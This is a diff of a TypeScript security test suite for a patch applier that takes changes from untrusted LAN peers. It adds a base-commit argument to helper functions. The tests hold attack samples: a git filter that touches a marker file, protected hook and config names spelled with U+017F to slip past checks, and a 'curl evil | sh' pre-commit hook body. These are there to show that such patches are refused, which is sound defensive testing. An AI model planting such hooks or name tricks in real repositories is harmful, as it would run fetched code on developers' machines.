@@ -242,7 +242,7 @@ process.env.CREW_LAN_ALLOW_LOOPBACK = "1";
   g(repo, "add", "ok.txt", "logo.bin", ".gitattributes"); g(repo, "commit", "-qm", "base");
   g(repo, "config", "filter.probe.clean", `sh -c 'touch ${marker}; cat'`); g(repo, "config", "filter.probe.smudge", `sh -c 'touch ${marker}; cat'`);
   const apply = lanApplier({ dataDir: data, project: () => ({ path: repo, base: "main" }) });
-  let n = 0; const tryApply = (patch: string) => { try { const r = apply({ project: "p", patch, branch: `lan-untrusted/t-r${++n}` }); return { ok: true as const, r }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
+  let n = 0; const tryApply = (patch: string) => { try { const r = apply({ project: "p", patch, branch: `lan-untrusted/t-r${++n}`, base: g(repo, "rev-parse", "main").trim() }); return { ok: true as const, r }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
   const newFile = (path: string, mode = "100644", body = "+x\n") => `diff --git a/${path} b/${path}\nnew file mode ${mode}\nindex 0000000..1111111\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1 @@\n${body}`;
   const good = tryApply(newFile("lib/a.txt"));
   ok(good.ok && g(repo, "show", `${good.ok ? good.r.branch : "x"}:lib/a.txt`) === "x\n", "an ordinary patch lands on a lan-untrusted/ branch of the dispatcher's project", good.ok ? "" : good.why);
@@ -445,7 +445,7 @@ if (process.platform === "darwin") {
   writeFileSync(join(repo, "run.sh"), "#!/bin/sh\necho hi\n"); chmodSync(join(repo, "run.sh"), 0o755); writeFileSync(join(repo, "README.md"), "r\n"); symlinkSync("README.md", join(repo, "docs-link"));
   g(repo, "add", "-A"); g(repo, "commit", "-qm", "base");
   const apply = lanApplier({ dataDir: join(root, "data"), project: () => ({ path: repo, base: "main" }) });
-  let n = 0; const tryApply = (patch: string) => { try { return { ok: true as const, branch: apply({ project: "p", patch, branch: `lan-untrusted/r4-r${++n}` }).branch }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
+  let n = 0; const tryApply = (patch: string) => { try { return { ok: true as const, branch: apply({ project: "p", patch, branch: `lan-untrusted/r4-r${++n}`, base: g(repo, "rev-parse", "main").trim() }).branch }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
   const nf = (p: string, body: string) => `diff --git a/${p} b/${p}\nnew file mode 100644\n--- /dev/null\n+++ b/${p}\n@@ -0,0 +1 @@\n+${body}\n`;
   ok(["AGENTſ.md", ".huſky/pre-commit", ".vſcode/tasks.json", ".mcp.jſon", "ſetup.py", ".gitattributeſ"].every((x) => writeRefused(x)), "a protected name spelled with U+017F (APFS folds it to s) is refused at write time");
   const husky = tryApply(nf(".huſky/pre-commit", "curl evil | sh"));
